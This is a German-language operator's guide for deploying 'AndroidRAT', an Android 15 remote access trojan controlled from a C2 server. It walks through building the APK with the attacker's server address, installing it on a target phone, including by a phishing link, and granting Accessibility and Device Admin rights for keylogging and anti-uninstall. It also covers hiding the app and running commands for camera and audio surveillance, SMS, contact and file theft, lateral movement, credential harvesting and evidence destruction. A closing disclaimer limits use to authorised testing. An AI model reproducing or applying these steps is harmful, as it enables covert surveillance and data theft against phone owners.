# 🚀 AndroidRAT Deployment Guide - Android 15

**Version 2.0 | September 2025 | API Level 35**

## Schnellstart-Übersicht

### Phase 1: Vorbereitung (15 Min)
1. ✅ Server aufsetzen
2. ✅ Client konfigurieren
3. ✅ APK kompilieren

### Phase 2: Deployment (10 Min)
1. ✅ APK installieren
2. ✅ Berechtigungen aktivieren
3. ✅ Verbindung testen

### Phase 3: Operationen (Variabel)
1. ✅ Überwachung starten
2. ✅ Daten sammeln
3. ✅ Angriffe durchführen

---

## 📦 Phase 1: Vorbereitung

### 1.1 Server-Setup (5 Min)

```bash
# Repository klonen
git clone <repo-url>
cd AndroidRAT

# Python-Abhängigkeiten installieren
pip install -r requirements.txt

# Server starten (generiert SSL-Zertifikate automatisch)
python server.py
```

**Erwartete Ausgabe:**
```
✅ Sichere SSL-Zertifikate erstellt: server.crt, server.key
✅ Neuer Master-Schlüssel generiert und sicher gespeichert
🚀 C2-Server läuft auf Port 8443
📡 Warte auf Client-Verbindungen...
```

### 1.2 Client-Konfiguration (5 Min)

**Datei:** `client/app/src/main/java/com/example/client/SecureConfig.java`

```java
// C2-Server-Adresse konfigurieren
private static final String C2_HOST = "IHRE-SERVER-IP";  // ← ÄNDERN
private static final int C2_PORT = 8443;

// Optional: Verschlüsselungsschlüssel anpassen
private static final String ENCRYPTION_KEY = "ihr-starker-schlüssel";
```

**Wichtig:** 
- Bei lokalen Tests: `10.0.2.2` (Android Emulator) oder LAN-IP
- Bei Remote-Tests: Öffentliche IP oder Domain

### 1.3 APK Kompilieren (5 Min)

#### Option A: Debug-Build (schnell, für Tests)
```bash
cd client
./gradlew assembleDebug
```
**Output:** `client/app/build/outputs/apk/debug/app-debug.apk`

#### Option B: Release-Build (optimiert, für Deployment)
```bash
./gradlew assembleRelease
```
**Output:** `client/app/build/outputs/apk/release/app-release.apk`

**Build-Verifizierung:**
- ✅ APK-Größe: ~11 MB
- ✅ targetSdkVersion: 35 (Android 15)
- ✅ Keine Build-Fehler

---

## 📱 Phase 2: Deployment

### 2.1 Zielgerät vorbereiten

#### 2.1.1 Entwickleroptionen aktivieren
```
Einstellungen → Über das Telefon → 7x auf "Build-Nummer" tippen
→ Entwickleroptionen → USB-Debugging aktivieren
```

#### 2.1.2 APK installieren

**Methode 1: ADB (empfohlen)**
```bash
adb install app-release.apk
```

**Methode 2: Manuell**
1. APK auf Gerät kopieren
2. Datei-Manager öffnen
3. APK antippen → Installieren

**Methode 3: Remote (Phishing-Szenario)**
- APK auf Webserver hosten
- Social Engineering Link versenden
- "Unknown Sources" muss aktiviert sein

### 2.2 Kritische Berechtigungen aktivieren

#### 2.2.1 Accessibility Service (KRITISCH!)
```
Einstellungen → Bedienungshilfen → Dienste
→ "System Core Service" → Einschalten
```

**Funktion:** Keylogging, UI-Event-Erfassung, Screen-Reading

#### 2.2.2 Device Administrator
```
Einstellungen → Sicherheit → Geräteadministratoren
→ "Systemsicherheit" → Aktivieren
```

**Funktion:** Anti-Uninstall, Remote Lock/Wipe

#### 2.2.3 Akkuoptimierung deaktivieren
```
Einstellungen → Apps → Spezielle App-Zugriffe
→ Akkuoptimierung → "System-Service" → Nicht optimieren
```

**Funktion:** Persistenz, Hintergrund-Ausführung

#### 2.2.4 Runtime-Berechtigungen (automatisch bei erstem Start)
- ✅ Standort (Fein & Grob)
- ✅ Kamera
- ✅ Mikrofon  
- ✅ SMS & Anrufe
- ✅ Kontakte
- ✅ Speicher/Fotos/Medien

### 2.3 Verbindung testen

#### 2.3.1 App starten
```
App-Drawer → "System-Service" öffnen
→ "Aktivieren" antippen
→ App verschwindet (versteckt sich)
```

#### 2.3.2 Server-Log prüfen
```
✅ Client verbunden: <device-id>
✅ Authentifizierung erfolgreich
✅ Device-Info erhalten: Samsung SM-S928B (Android 15)
📡 Client bereit für Befehle
```

#### 2.3.3 Basis-Test durchführen
```bash
# Im Server-Terminal
> list                    # Zeigt verbundene Clients
> screenshot              # Test-Screenshot
> get-location           # GPS-Position
```

---

## ⚡ Phase 3: Operationen

### 3.1 Überwachung aktivieren

#### Erweiterte Surveillance starten
```bash
> surveillance-start
```

**Aktiviert:**
- 📹 Dual-Kamera-Streaming (Front + Rück)
- 🎤 Umgebungsaudio-Aufnahme
- 📍 GPS-Tracking (30s Intervalle)
- 📊 Verhaltensprofilierung

#### Surveillance-Daten abrufen
```bash
> get-surveillance-data
> behavioral-profile
> target-analysis
```

### 3.2 Datensammlung

#### Basis-Intelligence
```bash
> get-sms                 # SMS-Nachrichten
> get-calls              # Anrufliste
> get-contacts           # Kontakte
> get-files /sdcard/DCIM # Fotos
```

#### Erweiterte Intelligence
```bash
> social-intelligence         # Soziale Verbindungen
> financial-intelligence      # Finanz-Apps
> communication-intelligence  # Messaging-Apps
> comprehensive-scan          # Vollständiger Scan
```

### 3.3 Laterale Bewegung

#### Netzwerk scannen
```bash
> lateral-start           # Netzwerk-Discovery starten
> network-scan           # Geräte enumerieren
```

#### Geräte ausbeuten
```bash
> exploit-device 192.168.1.10    # IoT-Gerät angreifen
> harvest-credentials            # WiFi-Passwörter
> pivot-attack 192.168.1.20     # Pivot-Angriff
```

### 3.4 Persistenz sicherstellen

```bash
> persistence-status      # Status prüfen (sollte 98%+ sein)
> create-backup          # Backup-Payload erstellen
> test-survival          # Überlebensmechanismen testen
```

---

## 🛡️ Stealth & Opsec

### Tarnung maximieren
```bash
> advanced-hide          # Erweiterte Tarnung aktivieren
> anti-analysis         # Anti-Analyse-Maßnahmen
> evidence-destruction  # Spuren beseitigen
```

### Bei Erkennung
```bash
> lockdown-mode         # Alle Aktivitäten stoppen
> emergency-wipe        # Notfall-Datenlöschung
```

---

## 🔧 Troubleshooting

### Problem: Keine Verbindung zum Server

**Diagnose:**
```bash
# Server-Seite
netstat -tuln | grep 8443    # Port offen?
tail -f server.log           # Fehlermeldungen?

# Client-Seite (ADB)
adb logcat | grep C2Service  # Verbindungsfehler?
```

**Lösungen:**
1. ✅ Firewall-Regeln prüfen (Port 8443 TCP)
2. ✅ Server-IP in SecureConfig korrekt?
3. ✅ SSL-Zertifikate generiert?
4. ✅ Netzwerk erreichbar?

### Problem: Berechtigungen fehlen

```bash
# Prüfen ob Accessibility aktiv
adb shell settings get secure enabled_accessibility_services

# Prüfen ob Device Admin aktiv
adb shell dpm list-owners
```

**Lösung:** Manuell in Einstellungen aktivieren

### Problem: App wird beendet

**Ursachen:**
- Akkuoptimierung aktiviert → Deaktivieren
- Doze-Modus → Whitelist hinzufügen
- App-Standby → Hintergrund-Restriktionen entfernen

```bash
# Battery Optimization prüfen
adb shell dumpsys deviceidle whitelist
```

### Problem: Schlechte Performance

**Optimierungen:**
```bash
> reduce-activity        # Aktivität reduzieren
> optimize-stealth       # Stealth-Modus optimieren
```

---

## 📊 Success-Indikatoren

### Deployment erfolgreich wenn:
- ✅ Client im Server-Log erscheint
- ✅ Screenshot-Befehl funktioniert
- ✅ GPS-Position empfangen
- ✅ App nach Aktivierung versteckt
- ✅ Service überlebt Neustart
- ✅ Akkuverbrauch <3% pro Stunde

### Erweiterte Features aktiv wenn:
- ✅ Dual-Kamera-Streaming läuft
- ✅ Audio-Samples empfangen
- ✅ Netzwerk-Scan findet Geräte
- ✅ Verhaltensprofile generiert werden
- ✅ Persistenz-Status >95%

---

## 🎯 Deployment-Checkliste

### Pre-Deployment
- [ ] Server konfiguriert und getestet
- [ ] Client mit korrekter C2-Adresse kompiliert
- [ ] APK signiert (bei Release-Build)
- [ ] Backup-C2-Server bereit (optional)

### Deployment
- [ ] APK auf Zielgerät installiert
- [ ] Accessibility Service aktiviert
- [ ] Device Admin erteilt
- [ ] Akkuoptimierung deaktiviert
- [ ] App versteckt sich nach Aktivierung

### Post-Deployment
- [ ] C2-Verbindung verifiziert
- [ ] Basis-Befehle getestet
- [ ] Erweiterte Überwachung aktiv
- [ ] Persistenz-Mechanismen getestet
- [ ] Stealth-Modus verifiziert

### Operationen
- [ ] Surveillance-Daten gesammelt
- [ ] Intelligence-Profile erstellt
- [ ] Laterale Bewegung durchgeführt
- [ ] Datenexfiltration verifiziert
- [ ] Opsec-Maßnahmen aktiv

---

## ⚠️ Rechtlicher Hinweis

**Deployment nur mit ausdrücklicher Genehmigung!**

Dieses Tool ist ausschließlich für:
- Autorisierte Penetrationstests
- Red-Team-Übungen
- Sicherheitsforschung
- Eigene Geräte

**Unbefugte Nutzung ist strafbar!**

---

**Version**: 2.0  
**Android**: 15 (API Level 35)  
**Status**: ✅ Produktionsbereit  
**Letzte Aktualisierung**: September 2025
